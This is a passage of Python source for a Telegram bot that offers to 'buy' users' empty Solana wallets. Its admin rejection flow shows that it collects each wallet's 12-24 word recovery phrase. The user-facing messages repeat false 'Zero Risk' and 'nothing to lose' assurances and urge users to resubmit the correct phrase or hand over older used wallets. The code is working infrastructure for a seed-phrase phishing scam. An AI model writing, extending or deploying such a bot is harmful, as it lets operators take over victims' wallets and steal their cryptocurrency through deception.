                "last_offer_sol": offer_sol,
                "last_offer_usd": offer_usd,
                "last_check": datetime.utcnow()
            },
            "$push": {
                "wallets_submitted": wallet
            },
            "$setOnInsert": {
                "user_id": user_id,
                "created_at": datetime.utcnow(),
                "earnings": 0,
                "sales": [],
                "referrals": [],
            }
        },
        upsert=True
    )
    
    # Update user state with offer details
    user_states[user_id] = {
        "state": "offer_given", 
        "wallet": wallet,
        "offer_sol": offer_sol,
        "offer_usd": offer_usd
    }
    
    # Create inline keyboard with Sell and Cancel buttons
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="💎 SELL NOW", callback_data="sell_wallet"),
            InlineKeyboardButton(text="❌ Cancel", callback_data="cancel_sale")
        ]
    ])
    
    await message.answer(
        f"🎉 PREMIUM OFFER APPROVED\n\n"
        f"💰 Your Exclusive Offer: {offer_sol} SOL (~${offer_usd:.2f} USD)\n\n"
        f"📊 Wallet Analysis:\n"
        f"• ✅ {tx_count} transactions verified\n"
        f"• ✅ Empty wallet - zero risk\n"
        f"• ✅ Qualified for premium payout\n"
        f"• 🏆 Your Tier: {get_user_tier(user_data)[1]} {get_user_tier(user_data)[0]}\n\n"
        f"🔒 Zero Risk Guarantee:\n"
        f"Your wallet is completely empty - you have nothing to lose\n\n"
        f"🚀 Secure your premium payout now",
        reply_markup=keyboard
    )

# CALLBACK QUERY HANDLERS
@dp.callback_query(F.data == "sell_wallet")
async def sell_wallet_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if user_id not in user_states or user_states[user_id].get("state") != "offer_given":
        await callback.message.answer("Please send a wallet address first to get an offer")
        return
    
    user_states[user_id]["state"] = "waiting_reward_address"
    
    await callback.message.answer(
        "🎯 Final Step: Payment Setup\n\n"
        "📥 Where should we send your payment?\n\n"
        "Please send the Solana address where you'd like to receive your funds\n\n"
        "⚠️ Important: This cannot be the same as the wallet you're selling\n\n"
        "🔒 Secure & Instant Transfer"
    )
    await callback.answer()

@dp.callback_query(F.data == "cancel_sale")
async def cancel_sale_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    user_states[user_id] = {"state": "start"}
    
    await callback.message.answer(
        "❌ Sale cancelled. No problem\n\n"
        "🚀 Remember: Empty wallets = Zero risk + Premium payouts\n\n"
        "Ready to try again? Send another wallet address anytime"
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("confirm_payment_"))
async def confirm_payment_callback(callback: types.CallbackQuery):
    sale_id = callback.data.replace("confirm_payment_", "")
    
    # Find the sale in database
    sale = sales_col.find_one({"sale_id": sale_id})
    if not sale:
        await callback.answer("Sale not found")
        return
    
    user_id = sale['user_id']
    offer_usd = sale['offer_usd']
    reward_address = sale['reward_address']
    
    # ENHANCEMENT 3: Instant payment processing
    await process_instant_payment(sale_id, user_id, offer_usd)
    
    # Update sale status
    sales_col.update_one(
        {"sale_id": sale_id},
        {"$set": {
            "status": "payment_sent",
            "payment_sent_at": datetime.utcnow()
        }}
    )
    
    # Update user earnings
    users_col.update_one(
        {"user_id": user_id},
        {"$inc": {"earnings": offer_usd}}
    )
    
    # ENHANCEMENT 7: Send smart notification
    await send_smart_notifications(user_id, "payment_sent")
    
    # Check for VIP upgrade
    user_data = users_col.find_one({"user_id": user_id})
    sales_count = len(user_data.get('sales', []))
    if sales_count in [1, 3, 5, 10, 15]:  # VIP milestone levels
        await send_smart_notifications(user_id, "vip_upgrade")
    
    await callback.message.edit_text(
        f"✅ Payment Confirmed\n\n"
        f"🆔 Sale ID: {sale_id}\n"
        f"👤 User ID: {user_id}\n"
        f"💰 Amount: ${offer_usd:.2f}\n"
        f"📥 Sent to: {reward_address}\n\n"
        "User has been notified of successful payment"
    )
    await callback.answer("Payment confirmed")

# ==================== ENHANCEMENT: ENHANCED REJECTION FLOW ====================
@dp.callback_query(F.data.startswith("reject_menu_"))
async def reject_menu_callback(callback: types.CallbackQuery):
    """Show rejection reason options"""
    sale_id = callback.data.replace("reject_menu_", "")
    
    rejection_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="🔑 Wrong Mnemonics", callback_data=f"reject_wrong_mnemonic_{sale_id}")
        ],
        [
            InlineKeyboardButton(text="💼 New Wallet", callback_data=f"reject_new_wallet_{sale_id}")
        ],
        [
            InlineKeyboardButton(text="⬅️ Back", callback_data=f"back_to_main_{sale_id}")
        ]
    ])
    
    await callback.message.edit_text(
        f"❌ **Select Rejection Reason**\n\n"
        f"Sale ID: {sale_id}\n\n"
        "**Choose the appropriate reason:**\n"
        "• 🔑 Wrong Mnemonics: Recovery phrase doesn't match wallet\n"
        "• 💼 New Wallet: No transaction history or brand new wallet",
        reply_markup=rejection_keyboard
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("back_to_main_"))
async def back_to_main_callback(callback: types.CallbackQuery):
    """Return to main admin menu"""
    sale_id = callback.data.replace("back_to_main_", "")
    
    sale = sales_col.find_one({"sale_id": sale_id})
    if not sale:
        await callback.answer("Sale not found")
        return
    
    admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Payment Sent", callback_data=f"confirm_payment_{sale_id}")
        ],
        [
            InlineKeyboardButton(text="❌ Reject Submission", callback_data=f"reject_menu_{sale_id}")
        ]
    ])
    
    await callback.message.edit_text(
        f"🔑 SALE SUBMISSION - VERIFICATION REQUIRED\n\n"
        f"🆔 Sale ID: {sale_id}\n"
        f"👤 User: @{sale.get('username', 'Unknown')} ({sale['user_id']})\n"
        f"💰 Offer: {sale['offer_sol']} SOL (${sale['offer_usd']:.2f})\n"
        f"📤 Wallet: {sale['wallet']}\n\n"
        f"**Please verify and take action:**",
        reply_markup=admin_keyboard
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("reject_wrong_mnemonic_"))
async def reject_wrong_mnemonic_callback(callback: types.CallbackQuery):
    """Reject due to wrong mnemonics"""
    sale_id = callback.data.replace("reject_wrong_mnemonic_", "")
    
    sale = sales_col.find_one({"sale_id": sale_id})
    if not sale:
        await callback.answer("Sale not found")
        return
    
    user_id = sale['user_id']
    wallet = sale['wallet']
    
    # Update sale status
    sales_col.update_one(
        {"sale_id": sale_id},
        {"$set": {
            "status": "rejected_wrong_mnemonic",
            "admin_reviewed_at": datetime.utcnow(),
            "rejection_reason": "wrong_mnemonic"
        }}
    )
    
    # Send professional rejection message to user
    try:
        await bot.send_message(
            user_id,
            "🔍 **Verification Result: Recovery Phrase Issue**\n\n"
            "❌ **Submission Rejected**\n\n"
            "**Issue Detected:**\n"
            "The recovery phrase provided does not correspond to the submitted wallet address.\n\n"
            "📋 **Possible Reasons:**\n"
            "• Incorrect recovery phrase for this wallet\n"
            "• Typographical errors in the phrase\n"
            "• Recovery phrase from different wallet\n\n"
            "💡 **Required Action:**\n"
            f"• Wallet: {format_wallet_address(wallet)}\n"
            "• Provide the CORRECT 12-24 word recovery phrase\n"
            "• Ensure all words are spelled correctly\n"
            "• Verify it's the exact phrase for this wallet\n\n"
            "🔄 **Next Steps:**\n"
            "Please resubmit with the correct recovery phrase, or submit a different qualified wallet.\n\n"
            "🔒 **Remember:** Empty wallets with transaction history only."
        )
    except Exception as e:
        logging.error(f"Failed to send rejection notification to user {user_id}: {e}")
    
    await callback.message.edit_text(
        f"❌ **Submission Rejected - Wrong Mnemonics**\n\n"
        f"🆔 Sale ID: {sale_id}\n"
        f"👤 User ID: {user_id}\n"
        f"📤 Wallet: {format_wallet_address(wallet)}\n\n"
        "**Reason:** Recovery phrase doesn't match wallet\n"
        "**Status:** User notified to provide correct phrase"
    )
    await callback.answer("Rejected - Wrong Mnemonics")

@dp.callback_query(F.data.startswith("reject_new_wallet_"))
async def reject_new_wallet_callback(callback: types.CallbackQuery):
    """Reject due to new wallet"""
    sale_id = callback.data.replace("reject_new_wallet_", "")
    
    sale = sales_col.find_one({"sale_id": sale_id})
    if not sale:
        await callback.answer("Sale not found")
        return
    
    user_id = sale['user_id']
    wallet = sale['wallet']
    
    # Update sale status
    sales_col.update_one(
        {"sale_id": sale_id},
        {"$set": {
            "status": "rejected_new_wallet",
            "admin_reviewed_at": datetime.utcnow(),
            "rejection_reason": "new_wallet"
        }}
    )
    
    # Send professional rejection message to user
    try:
        await bot.send_message(
            user_id,
            "🔍 **Verification Result: Wallet History Issue**\n\n"
            "❌ **Submission Rejected**\n\n"
            "**Issue Detected:**\n"
            "The submitted wallet lacks sufficient transaction history on the Solana network.\n\n"
            "📋 **Our Requirements:**\n"
            "• Minimum transaction history required\n"
            "• Established wallet with prior activity\n"
            "• Proof of network participation\n\n"
            "💡 **Solution:**\n"
            "• Submit a wallet that has been actively used\n"
            "• Ensure the wallet has transaction history\n"
            "• Used wallets from previous projects work best\n\n"
            "🔄 **Next Steps:**\n"
            "Please submit a different wallet with verifiable transaction history.\n\n"
            "🚀 **Qualified wallets receive instant premium offers!**\n\n"
            "🔒 **Zero Risk Policy:** We only purchase empty wallets."
        )
    except Exception as e:
        logging.error(f"Failed to send rejection notification to user {user_id}: {e}")
    
    await callback.message.edit_text(
        f"❌ **Submission Rejected - New Wallet**\n\n"
        f"🆔 Sale ID: {sale_id}\n"
        f"👤 User ID: {user_id}\n"
        f"📤 Wallet: {format_wallet_address(wallet)}\n\n"
        "**Reason:** Insufficient transaction history\n"
        "**Status:** User notified to submit used wallet"
    )
    await callback.answer("Rejected - New Wallet")

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())